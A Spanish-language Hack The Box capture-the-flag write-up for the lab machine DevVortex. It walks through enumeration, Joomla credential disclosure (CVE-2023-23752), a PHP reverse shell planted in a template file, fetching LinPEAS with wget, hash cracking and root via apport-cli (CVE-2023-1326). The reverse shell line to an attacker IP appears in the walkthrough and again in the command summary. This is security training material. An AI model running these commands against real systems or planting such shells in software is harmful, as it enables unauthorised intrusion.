# Hack The Box - DevVortex Write-up (Español)



## ⚙️ Información General  

| Nombre    | IP            | Dificultad | SO    |
|-----------|---------------|------------|-------|
| DevVortex | 10.10.11.242  | Facil      | Linux |  


![image](https://github.com/user-attachments/assets/430b1934-3770-480c-b6d0-ef9dac98a6cf)



---


### 1. Escaneo de puertos con Nmap:  

```
sudo nmap -sV -sC 10.10.11.242
```  

**Puertos abiertos encontrados:**  
```
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```  

---

## 🧭 Host Redirect

### 1. Agregar al `/etc/hosts`:  

```
sudo sh -c 'echo "10.10.11.242 devvortex.htb" >> /etc/hosts'
```  


## 🔍 Descubrimiento de Subdominios y Directorios  

### 3. Buscar subdominios:  

```
gobuster vhost -u devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```  

**Subdominio encontrado:**  
```
dev.devvortex.htb
```  

Agregar al `/etc/hosts`:  

```
10.10.11.242 dev.devvortex.htb devvortex.htb

```  

### 4. Enumeración de rutas/directorios:  

```
dirsearch -u http://dev.devvortex.htb/
```  

---

## 🔑 Explotación de Joomla  

### 5. Descubrimiento de versión vulnerable:  

Archivo accesible:  

Encontré una ruta que dirigía a un panel de administración y noté que se trataba del panel de Joomla. Al buscar en Google sobre Joomla, encontré la siguiente descripción:

```"Joomla, también estilizado como Joomla! y a veces abreviado como J!, es un sistema de gestión de contenido (CMS) gratuito y de código abierto para la publicación de contenido web. Las aplicaciones de contenido web incluyen foros de discusión, galerías de fotos, comercio electrónico y comunidades de usuarios, entre muchas otras aplicaciones basadas en la web." ```
Buscando en Google exploits para Joomla, encontré que las versiones anteriores a 4.2.8 son vulnerables a ejecución remota de código (RCE).

Así que necesitaba averiguar la versión exacta.

Explorando los archivos que había encontrado con dirbuster, vi el archivo:

/language/en-GB/langmetadata.xml

Disponible en:

http://dev.devvortex.htb/language/en-GB/langmetadata.xml

Allí confirmé que el servidor usaba Joomla Project y que la versión era vulnerable tanto a RCE como a information disclosure.



**Credenciales Joomla:**
Haciendo uso de este exploit, conseguimos las credenciales del Joomla

https://github.com/Acceis/exploit-CVE-2023-23752
```
Usuario: lewis
Contraseña: **********
```  

### 7. Acceso al panel de Joomla:  

```
http://dev.devvortex.htb/administrator/
```  

---

## ⚔️ Reverse Shell  

### 8. Inyección de reverse shell en Joomla  

Desde el panel:  
```
Sistema -> Plantillas de Administrador -> index.php
```  

### 9. Payload agregado al final de `index.php`:  

```php
<?php system("bash -c 'sh -i >& /dev/tcp/10.10.14.11/4444 0>&1'"); ?>
```  

⚠️ Reemplazar `10.10.14.11` por tu IP tun0.  

### 10. Escuchar conexión:  

```
nc -lvnp 4444
```  

### 11. Disparar la shell:  

```
http://dev.devvortex.htb/templates/cassiopeia/index.php
```  

✅ **Acceso como www-data**

---

## 📈 Escalada a Usuario  

### 12. Subida y ejecución de LinPEAS:  

```
python3 -m http.server 8000  # En atacante
wget http://10.10.14.11:8000/linpeas.sh  # En víctima
chmod +x linpeas.sh
./linpeas.sh
```  

### 13. Acceso a base de datos MySQL:  

```
mysql -u lewis -p
```  

### 14. Dump de hashes y crackeo con John:  

```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```  

### 15. Acceso SSH como usuario logan:  

```
ssh logan@devvortex.htb
```  

✅ **Usuario logan conseguido**

```
cat user.txt
```  

---

## 🔝 Escalada a Root  

### 16. Verificar permisos sudo:  

```
sudo -l
```  

**Resultado:**  
```
(ALL : ALL) ALL -> /usr/bin/apport-cli
```  

### 17. Exploitar `apport-cli` (CVE-2023-1326):  

```
sudo apport-cli
```  

Dentro de `apport-cli`, escribir `v` para abrir el editor, luego escribir:  

```
!/bin/bash
```  

✅ **Acceso como root**

```
cat /root/root.txt
```  

---

## 📝 Conclusión  

- ✅ Acceso inicial mediante vulnerabilidad de Joomla y reverse shell desde plantilla Cassiopeia.  
- ✅ Escalada a usuario a través de credenciales en base de datos y crackeo de hashes.  
- ✅ Escalada a root mediante abuso de `apport-cli` vulnerable (CVE-2023-1326).  

---

## 🚩 Flags  

- **User:** ✅  
- **Root:** ✅  

---

## 💡 Comandos Útiles  

```bash
# Nmap básico
sudo nmap -sV -sC 10.10.11.242

# Enumeración VHOST
gobuster vhost -u devvortex.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt

# Enumeración de directorios
dirsearch -u http://dev.devvortex.htb/

# Reverse Shell
<?php system("bash -c 'sh -i >& /dev/tcp/10.10.14.11/4444 0>&1'"); ?>

# Escuchar conexión
nc -lvnp 4444

# Subir LinPEAS
python3 -m http.server 8000
wget http://10.10.14.11:8000/linpeas.sh

# MySQL login
mysql -u lewis -p

# Crackear hashes
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt

# Escalar a root con apport-cli
sudo apport-cli
# Dentro del editor:
!/bin/bash
```

---

## 🎯 Resumen  

Máquina enfocada en:  
- Explotación de Joomla.  
- Recolección de credenciales y movimientos laterales.  
- Escalada de privilegios mediante binarios vulnerables.  

---
